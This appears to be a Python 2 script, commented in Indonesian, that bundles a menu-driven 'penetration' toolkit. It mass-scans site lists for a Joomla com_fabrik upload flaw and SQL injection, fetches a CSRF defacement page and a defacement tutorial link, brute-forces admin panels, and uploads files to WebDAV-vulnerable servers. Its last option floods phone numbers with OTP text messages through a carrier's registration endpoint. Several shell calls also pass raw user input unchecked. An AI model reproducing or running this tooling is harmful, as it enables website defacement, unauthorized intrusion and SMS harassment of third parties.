#GX USAH ADA ACARA RECODE
#RECODE GX BUAT LU PRO :P
#Ini Bahan
import requests, os, sys, time, random

#ini Warna
G = "\033[32;1m"
R = "\033[31;1m"
B = "\033[35;1m"
Y = "\033[33;1m"
P = "\033[34;1m"
A = "\033[36;1m"
W = "\033[39;1m"

#ini Mengetik
def mengetik(s):
 for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)

#ini Panah
L = W+"root@localhost~# "
#ini Banner
os.system('clear')
mengetik(G+'-------------------------------------')
mengetik(G+'+\033[36;1m        Penetration Web Scan       \033[32;1m+')
mengetik(G+'+\033[39;1m           By H1B1K1_404           \033[32;1m+')
mengetik(G+'-------------------------------------')
time.sleep(1)

#ini Daftar Isi
print
print Y+"[\033[36;1m1\033[33;1m]", G+"Scan Com_Fabrik"
print Y+"[\033[36;1m2\033[33;1m]", A+"Sql_Checker"
print Y+"[\033[36;1m3\033[33;1m]", R+"CSRF Com_Fabrik Maker"
print Y+"[\033[36;1m4\033[33;1m]", G+"Admin Panel Finder"
print Y+"[\033[36;1m5\033[33;1m]", A+"Nmap Scan Port"
print Y+"[\033[36;1m6\033[33;1m]", R+"Webdav Exploiter"
print Y+"[\033[36;1m7\033[33;1m]", W+"Nmap Scan Host Web"
print Y+"[\033[36;1m8\033[33;1m]", G+"Http Header Check"
print Y+"[\033[36;1m9\033[33;1m]", A+"Ping Network"
print Y+"[\033[36;1m10\033[33;1m]", R+"SpamSMS Massall"
print
plh = raw_input(L+"\033[32;1mMasukan Pilihan : ")

if plh == "1":
 os.system('clear')
 import requests
 import os, sys
 #ini warna
 G = "\033[32;1m"                                                                                                        
 R = "\033[31;1m"
 B = "\033[35;1m"
 Y = "\033[33;1m"
 P = "\033[34;1m"
 A = "\033[36;1m"
 W = "\033[39;1m"
 print G+'------------------------------'
 print G+'+     \033[36;1mScan Com_Fabrik V1     \033[32;1m+'
 print G+'+     \033[39;1m  By H1B1K1_404        \033[32;1m+'
 print G+'------------------------------'
 print " "
 weblist = raw_input("\033[33;1mMasukan Web List : ")
 print " "
 length = len(open(weblist,'r').read().split("\n"))
 for web in open(weblist,'r').read().split("\n"):
  exp = "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
  print "\033[36;1mScan",web
  r = requests.get(web+exp)
  rsp = b'{"filepath":null,"uri":null}' in r.content
  if rsp == True:
   print" "
   print G+'Web Vuln :-)'
   print Y
  else:
   print " "
   print R+'Web Not Vuln :-('
   print Y

elif plh == "2":
 import requests, os, sys, time, random
 #ini warna
 G = "\033[32;1m"
 R = "\033[31;1m"
 B = "\033[35;1m"
 Y = "\033[33;1m"
 P = "\033[34;1m"
 A = "\033[36;1m"
 W = "\033[39;1m"
 os.system('clear')
 print G+'------------------------------'
 print G+'+     \033[36;1mScan Sqli_Checker      \033[32;1m+'
 print G+'+     \033[39;1m  By H1B1K1_404        \033[32;1m+'
 print G+'------------------------------'
 print " "
 weblist = raw_input("\033[33;1mMasukan Web List : ")
 print " "
 print A+"Cie Cari Celah Web Teyoss...", W+"Cari Celah Hati Cewek Kapan Mank?/:-)", Y
 print " "
 length = len(open(weblist,'r').read().split("\n"))
 for web in open(weblist,'r').read().split("\n"):
  exp ="'"
  r = requests.get(web+exp)
  rsp = "error" in r.text
  if rsp == True:
   print web, '\033[36;m>>>', '\033[32;1mVuln \033[33;1m'
  else:
   print web, '\033[36;1m>>>', '\033[31;1mNot Vuln \033[33;1m'

elif plh == "3":
 os.system('clear')
 os.system('curl -o CSRF.html -LO https://pastebin.com/raw/L11cCkNu')
 print
 print W+"Succes, Save As Name",A+">>>",B+"CSRF.html"
 print
 print G+"Done",A+"Tutorial Edit Script",Y+"http://noobxploitcyber.blogspot.com/2018/05/cara-deface-comfabrik-with-csrf-di.html?m=1",W
 print

elif plh == "4":
 import requests, os, sys, time
 #ini warna
 G = "\033[32;1m"
 R = "\033[31;1m"
 B = "\033[35;1m"
 Y = "\033[33;1m"
 P = "\033[34;1m"
 A = "\033[36;1m"
 W = "\033[39;1m"
 #ini coding
 wk = '\033[36;1m# '
 os.system('curl -o mm.txt -LO https://pastebin.com/raw/j1LdeTL4')
 os.system('clear')
 def main():
  print G+'-----------------------------'
  print G+'+    \033[36;1m Admin_PanelFinder     \033[32;1m+'
  print G+'+     \033[39;1m  By H1B1K1_404       \033[32;1m+'
  print G+'-----------------------------'
  print " "
  web = raw_input("\033[33;1mMasukan Web, Contoh(http://web.com/) : ")
  word = 'mm.txt'
  time.sleep(1)
  print " "
  print W+'Cari Admin Login Teyoss...., \033[36;1mCari Pasangan Kapan Mank? :-)'
  time.sleep(1)
  print " "
  length = len(open(word,'r').read().split("\n"))
  for admn in open(word,'r').read().split("\n"):
   r = requests.get(web+admn)
   rsp = r.status_code
   if rsp == 404:
    print "\033[31;1mTidak Ditemukan \033[36;1m>>> \033[33;1m", web+admn
   else:
    print "\033[32;1mDitemukan \033[36;1m>>> \033[33;1m", web+admn
 try:
         main()
 except KeyboardInterrupt:
         print " "
         print A+'CTRL+C Detected, Exit Stah :v'
         print " "

elif plh == "5":
 os.system('clear')
 print G+"-----------------------------"
 print A+"+      ",   Y+"NMAP SCAN PORT", A+"     +"
 print A+"+        ", W+"By H1B1K1_404", A+"    +"
 print G+"-----------------------------"
 print
 print B+"Scan Port Teyoss",G+"Scan Otak Donk Mank, Sapa Tahu", R+"Gx Ada :-)", A+"Canda Mank :v"
 print
 prt = raw_input(W+"Masukan Domain / Ip Web \033[31;1m[JANGAN MEMAKAI http / https!]: ")
 time.sleep(1)
 print
 print P+"[\033[36;1m1\033[34;1m]",G+"Fast Scan Port"
 print P+"[\033[36;1m2\033[34;1m]",W+"Scan Port \033[33;1m<\033[31;1mNot Random Port\033[33;1m>"
 print
 fprt = raw_input("Pilih Nomor : ")
 if fprt == "1":
  os.system('nmap -F '+prt)
  print
  print A+">>> \033[32;1mDONE :-)"
  print
 elif fprt == "2":
  os.system('nmap -r '+prt)
  print
  print A+">>> \033[32;1mDONE :-)"
  print
 else:
  print R+"Error..."
elif plh == "6":
 os.system('clear')
 print G+"-----------------------------"
 print A+"+      ",   Y+"Webdav Exploit", A+"     +"
 print A+"+        ", W+"By H1B1K1_404", A+"    +"
 print G+"-----------------------------"
 print
 f = raw_input("Masukan Alamat File Pepes : ")
 w = raw_input("Masukan Web Vuln Webdav : ")
 expl = f+" "+w
 os.system('curl -T '+expl)
 print
 print "\033[32;1mDone "
 print

elif plh == "7":
 os.system('clear')
 print G+"-----------------------------"
 print A+"+      ",   Y+" Host Hunter", A+"       +"
 print A+"+        ", W+"By H1B1K1_404", A+"    +"
 print G+"-----------------------------"
 print
 pr = raw_input('Masukan Domain, Tanpa http / https : ')
 print
 os.system('nmap -p -80 --script dns-brute.nse '+pr)
 print
 print G+'Done', A+'Hunter Host Terus Mank??', W+'Hunter Hati Orang Kapan Mank? :-)'
 print

elif plh == "8":
 os.system('clear')
 print G+"------------------------------"
 print A+"+      ",   Y+"Host Checker", A+"        +"
 print A+"+        ", W+" By H1B1K1_404", A+"    +"
 print G+"------------------------------"
 print
 rp = raw_input('Masukan Host : ')
 print
 os.system('curl -G https://api.hackertarget.com/httpheaders/?q='+rp)
 print
 print G+'Done', A+'Check Host Teyoss Mank??', W+'Check Hati Orang Kapan Mank??? :-)'
 print

elif plh == "9":
 os.system('clear')
 print G+"------------------------------"
 print A+"+      ",   Y+"Ping Network", A+"        +"
 print A+"+        ", W+" By H1B1K1_404", A+"    +"
 print G+"------------------------------"
 print
 pw = raw_input('Masukan Domain : ')
 print
 os.system('ping '+pw)
 print
 print B+'Done'
 print

elif plh == "10":
 #Recode Gx Buat Lu Pro, wkwkwkwkwk
 import requests, time, os, sys, random
 import sys
 import time
 #ini warna
 G = "\033[32;1m"
 R = "\033[31;1m"
 B = "\033[35;1m"
 Y = "\033[33;1m"
 P = "\033[34;1m"
 A = "\033[36;1m"
 W = "\033[39;1m"
 #ini coding
 os.system('clear')
 wk = '\033[36;1m# '
 print (G+'------------------------------')
 print (G+'+	\033[36;1mSpam SMS Massal V1   \033[32;1m+')
 print (G+'+	\033[39;1m  By H1B1K1_404      \033[32;1m+')
 print (G+'------------------------------')
 print (" ")
 nmrlist = raw_input("\033[33;1mMasukan No List : ")
 length = len(open(nmrlist,'r').read().split("\n"))
 for nmr in open(nmrlist,'r').read().split("\n"):
  count = 0
  payload=dict(msisdn=nmr)
  print (" ")
  print("\033[36;1m# \033[32;1mBerhasil Memuat \033[39;1m{} \033[32;1mNomor \033[33;1mMencoba Mengirim \033[39;1m{} {}".format(length,nmr))
  r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP', data=payload)
  vld = b'{"code":"500","status":"failed","message":"Format nomor Tri salah, silahkan cek kembali."}' in r.content
  if vld == True:
   print (wk+'\033[31;1mNomer Tidak Valid Stah :-(')
  else:
   print (wk+'\033[32;1mNomer Valid :-)')
   time.sleep(1)
   rsp2 = '<html>' in r.text
   if rsp2 == True:
    print (wk+'\033[31;1mMengirim Gagal, Requests Diblock Admin Stah :-(')
   else:
    rsp1 = '"code":"400"' in r.text
    if rsp1 == True:
     print (wk+'\033[31;1mGagal Mengirim Stah :-(')
    else:
     rsp3 = '"200"' in r.text
     if rsp3 == True:
      print (wk+'\033[32;1mOk Stah, Berhasil Mengirim :-)')
     else:
      print (wk+'\033[31;1mGagal Mengirim Stah :-(')
